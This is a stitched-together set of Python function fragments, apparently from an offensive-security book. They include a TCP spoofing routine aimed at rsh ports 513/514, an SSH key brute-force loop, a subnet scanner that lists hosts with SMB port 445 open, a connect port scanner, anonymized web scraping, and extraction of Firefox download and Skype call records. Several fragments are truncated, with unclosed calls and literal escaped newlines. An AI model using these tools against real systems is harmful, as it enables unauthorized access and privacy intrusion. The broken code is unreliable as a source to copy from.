def get_tweets(self): \n         query = urllib.quote_plus('from:' + self.handle+ ' since:2009-01-01 include:retweets') \n         tweets = [] \n         browser = anonBrowser() \n         browser.anonymize() \n         response = browser.open('http://search.twitter.com/'+ 'search.json?q=' + query) \n  \n         json_objects = json.load(response) \n         for result in json_objects['results']: \n             new_result = {} \n             new_result['from_user'] = result['from_user_name'] \n             new_result['geo'] = result['geo'] \n             new_result['tweet'] = result['text'] \n             tweets.append(new_result) \n         return tweets \n
def printDownloads(downloadDB): \n     conn = sqlite3.connect(downloadDB) \n     c = conn.cursor() \n     c.execute('SELECT name, source, datetime(endTime/1000000,\'unixepoch\') FROM moz_downloads;' \n
def spoofConn(src, tgt, ack): \n     IPlayer = IP(src=src, dst=tgt) \n     TCPlayer = TCP(sport=513, dport=514) \n     synPkt = IPlayer / TCPlayer \n     send(synPkt) \n  \n     IPlayer = IP(src=src, dst=tgt) \n     TCPlayer = TCP(sport=513, dport=514, ack=ack) \n     ackPkt = IPlayer / TCPlayer \n     send(ackPkt) \n
def dnsQRTest(pkt): \n     if pkt.haslayer(DNSRR) and pkt.getlayer(UDP).sport == 53: \n         rcode = pkt.getlayer(DNS).rcode \n         qname = pkt.getlayer(DNSQR).qname \n         if rcode == 3: \n             return True \n         else: \n             return False \n
def downloadImage(imgTag): \n     try: \n         imgSrc = imgTag['src'] \n         imgContent = urllib2.urlopen(imgSrc).read() \n         imgFileName = basename(urlsplit(imgSrc)[2]) \n         imgFile = open(imgFileName, 'wb') \n         imgFile.write(imgContent) \n         imgFile.close() \n         return imgFileName \n     except: \n         return '' \n
def findTgts(subNet): \n     nmScan = nmap.PortScanner() \n     nmScan.scan(subNet, '445') \n     tgtHosts = [] \n     for host in nmScan.all_hosts(): \n         if nmScan[host].has_tcp(445): \n             state = nmScan[host]['tcp'][445]['state'] \n             if state == 'open': \n                 tgtHosts.append(host) \n     return tgtHosts \n
def mirrorImages(url, dir): \n     ab = anonBrowser() \n     ab.anonymize() \n     html = ab.open(url) \n     soup = BeautifulSoup(html) \n     image_tags = soup.findAll('img') \n  \n     for image in image_tags: \n         filename = image['src'].lstrip('http://') \n         filename = os.path.join(dir,filename.replace('/', '_')) \n         data = ab.open(image['src']).read() \n         ab.back() \n         save = open(filename, 'wb') \n         save.write(data) \n         save.close() \n
def connScan(tgtHost, tgtPort): \n     try: \n         connSkt = socket(AF_INET, SOCK_STREAM) \n         connSkt.connect((tgtHost, tgtPort)) \n         connSkt.send('ViolentPython\r\n') \n         results = connSkt.recv(100) \n         screenLock.acquire() \n     except: \n         screenLock.acquire() \n     finally: \n         screenLock.release() \n         screenLock.close() 
def connect(user,host,keyfile,release): \n     global Stop \n     global Fails \n     try: \n         perm_denied = 'Permission denied' \n         ssh_newkey = 'Are you sure you want to continue' \n         conn_closed = 'Connection closed by remote host' \n         opt = ' -o PasswordAuthentication=no' \n         connStr = 'ssh ' + user +\ \n           '@' + host + ' -i ' + keyfile + opt \n         child = pexpect.spawn(connStr) \n         ret = child.expect([pexpect.TIMEOUT,perm_denied,ssh_newkey,conn_closed,'$','#',]) \n         if ret == 2: \n             child.sendline('yes') \n             connect(user, host, keyfile, False) \n         elif ret == 3: \n             Fails += 1 \n         elif ret > 3: \n             Stop = True \n     finally: \n         if release: \n             connection_lock.release() \n
def printCallLog(skypeDB): \n     conn = sqlite3.connect(skypeDB) \n     c = conn.cursor() \n     c.execute("SELECT datetime(begin_timestamp,'unixepoch'),  identity FROM calls, conversations WHERE  calls.conv_dbid = conversations.id;" \n
